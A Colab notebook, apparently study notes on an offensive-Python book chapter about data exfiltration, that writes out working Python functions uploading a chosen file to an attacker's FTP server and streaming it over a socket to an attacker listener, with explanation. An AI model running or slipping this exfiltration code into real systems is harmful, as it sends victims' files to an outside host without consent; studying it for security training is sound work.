{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyN3FOG8SPnAdR8litWWAY18",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/damianiRiccardo90/BHP/blob/master/C9-Fun_With_Exfiltration/File_Transfer_Exfiltration.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### *__File Transfer Exfiltration__*\n",
        "\n",
        "Open a new file, __transmit_exfil.py__, which we'll use to send our encrypted information via file transfer:"
      ],
      "metadata": {
        "id": "8_NwOn6EWb6B"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import ftplib\n",
        "import os\n",
        "import socket\n",
        "import win32file\n",
        "\n",
        "def plain_ftp(docpath, server='192.168.1.203'): #[1]\n",
        "    ftp = ftplib.FTP(server)\n",
        "    ftp.login('anonymous', 'anon@example.com') #[2]\n",
        "    ftp.cwd('/pub/') #[3]\n",
        "    ftp.storbinary('STOR ' + os.path.basename(docpath),\n",
        "                   open(docpath, 'rb'), 1024) #[4]\n",
        "    ftp.quit()"
      ],
      "metadata": {
        "id": "BWttO7P4Wmro"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "We import __ftplib__, which we'll use for the platform-independent function, and __win32file__, for our Windows-specific function.\n",
        "\n",
        "We, the authors, set up our Kali attacker machine to enable the FTP server and accept anonymous file uploads. In the __plain_ftp__ function, we pass in the path to a file we want to transfer (__docpath__) and the IP address of the FTP server (the Kali machine), assigned to the __server__ variable __[1]__.\n",
        "\n",
        "Using the Python __ftplib__ makes it easy to create a connection to the server log in __[2]__, and navigate to the target directory __[3]__. Finally, we write the file to the target directory __[4]__.\n",
        "\n",
        "To create Windows-specific version, write the __transmit__ function, which takes the path to the file we want to transfer (__document_path__):"
      ],
      "metadata": {
        "id": "SguaEh6dXOKm"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def transmit(document_path):\n",
        "    client = socket.socket()\n",
        "    client.connect(('192.168.1.207', 10000)) #[1]\n",
        "    with open(document_path, 'rb') as f:\n",
        "        win32file.TransmitFile(\n",
        "            client,\n",
        "            win32file._get_osfhandle(f.fileno()),\n",
        "            0, 0, None, 0, b'', b''\n",
        "        ) #[2]"
      ],
      "metadata": {
        "id": "wKagY6LmYbVY"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Just as we did in Chapter 2, we open a socket to a listener on our attacker machine using a port of our choosing; here, we use port 10000 __[1]__. Then we use the __win32file.TransmitFile__ function to transfer the file __[2]__. The main block provides a simple test by transmitting a file (__mysecrets.txt__ in this case) to the listening machine:"
      ],
      "metadata": {
        "id": "YLCsnxb-Y-Wj"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "if __name__ == '__main__':\n",
        "    transmit('./mysecrets.txt')"
      ],
      "metadata": {
        "id": "qEY2AWLXZeR0"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "One we've received the encrypted file, we can read from that file in order to decrypt it."
      ],
      "metadata": {
        "id": "JxKCtlzmZlq8"
      }
    }
  ]
}